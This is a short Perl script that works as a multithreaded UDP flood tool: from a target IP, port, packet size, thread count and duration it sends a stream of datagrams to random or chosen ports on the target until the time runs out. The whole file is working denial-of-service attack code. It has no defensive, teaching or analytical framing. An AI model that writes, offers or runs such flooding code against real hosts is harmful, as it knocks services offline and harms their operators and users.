#!/usr/bin/perl
use 5.010;
use Socket;
use threads;

my ($tc, $ip, $port,$pps,$time) = @ARGV;
my ($psize, $pport);

my $end = time() + ($time ? $time : 100);

$targ = inet_aton("$ip") or die();
socket(flood, PF_INET, SOCK_DGRAM, 17);

sub udpkill{
  my $PPOS = $_[0];
  threads->create(sub{
    for(;time() <= $end;)
    {
      for(my $x = 0; $x < $PPOS; $x++){
        eval {
          $psize = $pps ? $pps : int(rand(1500000-64)+64) ;
          $pport = $port ? $port : int(rand(1500000))+1;
          send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,$targ));
        };
        if ($@) {
          sleep 1;
        }
      }
    }
  });
}

for(my $i = 0; $i < $tc+1; $i++){

  eval {
    udpkill(5);
    print($i == $tc - 1? "Started" : sleep 1);
  };
  if ($@) {
    sleep 1;
    print("Failure");
  }
}
print("started threads");
$_->join() for threads->list();
